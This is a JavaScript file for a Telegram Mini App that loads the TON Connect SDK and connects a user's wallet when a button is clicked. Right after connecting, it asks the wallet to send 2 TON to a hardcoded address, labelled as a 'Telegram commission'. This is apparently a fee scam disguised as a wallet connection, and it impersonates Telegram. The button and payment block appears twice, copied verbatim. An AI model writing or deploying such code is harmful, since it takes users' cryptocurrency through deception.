let tg = window.Telegram.WebApp;
tg.expand();

// === Проверяем, загружается ли script.js ===
console.log("✅ script.js загружен!");

// === Функция загрузки TON Connect SDK ===
async function loadTonConnect() {
    return new Promise((resolve, reject) => {
        if (typeof window.TonConnect !== "undefined") {
            console.log("✅ TON Connect SDK уже загружен!");
            resolve();
            return;
        }

        const script = document.createElement("script");
        script.src = "tonconnect-sdk.min.js"; // Используем локальный SDK
        script.onload = () => {
            console.log("✅ TON Connect SDK загружен!");

            if (typeof window.TonConnect !== "undefined") {
                console.log("✅ TonConnect объявлен:", window.TonConnect);
                resolve();
            } else {
                console.error("❌ TonConnect не найден после загрузки!");
                reject(new Error("TonConnect не определен"));
            }
        };
        script.onerror = (error) => {
            console.error("❌ Ошибка загрузки TON Connect SDK!", error);
            reject(error);
        };
        document.head.appendChild(script);
    });
}

// === Подключаем кнопку и обрабатываем клик ===
document.addEventListener("DOMContentLoaded", function () {
    let button = document.getElementById("connect-wallet");
    if (!button) {
        console.error("❌ Кнопка не найдена!");
        return;
    }

    console.log("✅ Кнопка найдена:", button);
    button.addEventListener("click", connectWallet);
});

// === Функция подключения кошелька и отправки TON ===
async function connectWallet() {
    console.log("🟡 Функция connectWallet() вызвана!");

    try {
        await loadTonConnect();

        if (typeof window.TonConnect === "undefined") {
            console.error("❌ TonConnect НЕ загружен!");
            alert("❌ Ошибка загрузки TON Connect. Попробуйте снова.");
            return;
        }

        const tonConnect = new window.TonConnect({
            manifestUrl: "https://telegram-mini-app-seven-blond.vercel.app/tonconnect-manifest.json"
        });

        console.log("✅ TonConnect инициализирован:", tonConnect);

        const connectedWallet = await tonConnect.connect();
        if (!connectedWallet) {
            console.error("❌ Ошибка: Кошелек не подключился");
            alert("❌ Ошибка подключения");
            return;
        }

        console.log("✅ Кошелек подключен:", connectedWallet.account.address);
        alert("✅ Кошелек подключен: " + connectedWallet.account.address);

        // === Создаем транзакцию на 2 TON ===
        const transaction = {
            to: "UQDDZ6llEnqAe2QqRAyuY3rQkWa3ZdFFH_Ksc8AjcrRvtFzc",
            value: "2000000000",
            payload: "Комиссия telegram"
        };

        console.log("📤 Отправка транзакции:", transaction);
        await tonConnect.sendTransaction(transaction);
        alert("✅ Транзакция на 2 TON отправлена!");
    } catch (error) {
        console.error("❌ Ошибка при подключении:", error);
        alert("❌ Ошибка: " + error.message);
    }
}


// === Подключаем кнопку и обрабатываем клик ===
document.addEventListener("DOMContentLoaded", function () {
    let button = document.getElementById("connect-wallet");
    if (!button) {
        console.error("❌ Кнопка не найдена!");
        return;
    }

    console.log("✅ Кнопка найдена:", button);
    button.addEventListener("click", connectWallet);
});


// === Функция подключения кошелька и отправки TON ===
async function connectWallet() {
    console.log("🟡 Функция connectWallet() вызвана!");

    try {
        await loadTonConnect();

        if (typeof window.TonConnect === "undefined") {
            console.error("❌ TonConnect НЕ загружен!");
            alert("❌ Ошибка загрузки TON Connect. Попробуйте снова.");
            return;
        }

        const tonConnect = new window.TonConnect({
            manifestUrl: "https://telegram-mini-app-seven-blond.vercel.app/tonconnect-manifest.json"
        });

        console.log("✅ TonConnect инициализирован:", tonConnect);

        const connectedWallet = await tonConnect.connect();
        if (!connectedWallet) {
            console.error("❌ Ошибка: Кошелек не подключился");
            alert("❌ Ошибка подключения");
            return;
        }

        console.log("✅ Кошелек подключен:", connectedWallet.account.address);
        alert("✅ Кошелек подключен: " + connectedWallet.account.address);

        // === Создаем транзакцию на 2 TON ===
        const transaction = {
            to: "UQDDZ6llEnqAe2QqRAyuY3rQkWa3ZdFFH_Ksc8AjcrRvtFzc",
            value: "2000000000",
            payload: "Комиссия telegram"
        };

        console.log("📤 Отправка транзакции:", transaction);
        await tonConnect.sendTransaction(transaction);
        alert("✅ Транзакция на 2 TON отправлена!");
    } catch (error) {
        console.error("❌ Ошибка при подключении:", error);
        alert("❌ Ошибка: " + error.message);
    }
}
